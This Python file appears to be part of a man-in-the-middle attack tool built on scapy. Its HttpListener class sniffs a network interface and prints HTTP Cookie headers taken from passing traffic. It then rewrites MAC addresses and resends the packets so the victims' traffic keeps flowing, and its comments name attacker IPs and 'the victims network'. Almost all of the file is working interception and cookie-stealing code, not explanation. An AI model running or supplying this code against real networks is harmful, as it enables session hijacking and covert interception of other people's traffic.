#!/usr/bin/python

import re
import threading

from scapy.all import sniff
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether, sendp
from ip_to_mac_mapper import IpToMacMapper


class HttpListener(threading.Thread):
    # @todo replace these hard coded values
    network_interface = "enp0s3"
    attacker_ips = ['192.168.56.103']

    def handle_packet(self, packet):
        """
        :param Ether packet:
        :return:
        """
        tcp = packet.getlayer("TCP")
        if tcp is not None:
            match = re.search(r"Cookie: (.+)", str(tcp.payload))
            if match:
                print(match.group(1))

        # Only consider packets with an IP part.
        if IP in packet:
            # Try to lookup the actual mac address of the package
            target_dst = self._ip_to_mac_mapping.get(packet[IP].dst)
            if target_dst is None:
                print('received a packet for an unknown host (%s)' % packet[IP].dst)
                return

            # Ignore packets target towards our self or already correctly targeted packets, since either we generated
            # them or they are legitimate packets originating from our own host.
            if packet[IP].dst not in self.attacker_ips and target_dst != packet.dst:
                print('redirecting a packet from %s (%s) to %s' % (packet.dst, packet[IP].dst, target_dst))
                packet.dst = target_dst
                sendp(packet)

    def __init__(self, ip_to_mac_mapping):
        """
        :param IpToMacMapper ip_to_mac_mapping:
        """
        threading.Thread.__init__(self)
        self._ip_to_mac_mapping = ip_to_mac_mapping

    def run(self):
        sniff(
            iface=self.network_interface,
            store=0,
            # packet_filter="tcp and port 80", # @todo move this filtering to a later point in time, filtering here would break the victims network
            prn=self.handle_packet
        )
